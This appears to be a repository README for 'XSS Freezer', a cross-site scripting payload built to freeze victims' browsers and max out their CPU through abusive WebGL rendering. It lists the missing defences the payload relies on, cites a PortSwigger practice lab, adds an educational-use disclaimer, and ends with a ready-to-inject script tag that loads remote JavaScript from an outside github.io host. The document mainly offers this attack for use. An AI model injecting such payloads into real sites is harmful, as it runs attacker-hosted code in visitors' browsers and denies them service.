XSS Freezer is an XSS vulnerability (Stored, Reflected) payload that crashes the browser and warms up the CPU due to a 100% load. CPU load is achieved due to WebGL 2.0 with extreme settings, complex shaders, mass particle rendering, interactivity, and negative code optimization (i.e. not for the benefit but for the detriment of the user).

The script will work if the page is missing:
* SOP (Same-Origin Policy);
* CSP (Content Security Policy);
* Input validation;
* And other technologies that prevent XSS.

For the test, you can run the laboratory in https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.

⚠️ Important: This payload is intended solely for educational purposes and testing on protected systems. Use in real attacks violates laws and ethical standards. The author of the repository is not responsible for the use of this payload by third parties.

https://github.com/user-attachments/assets/e35d05a5-1d54-42a2-89e8-511a6380acd5

------------------------------------------

```<script>var c=document.createElement('canvas');c.id='cpuCanvas';document.body.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Freezer-XSS/freezer.js';document.body.appendChild(r);</script>```
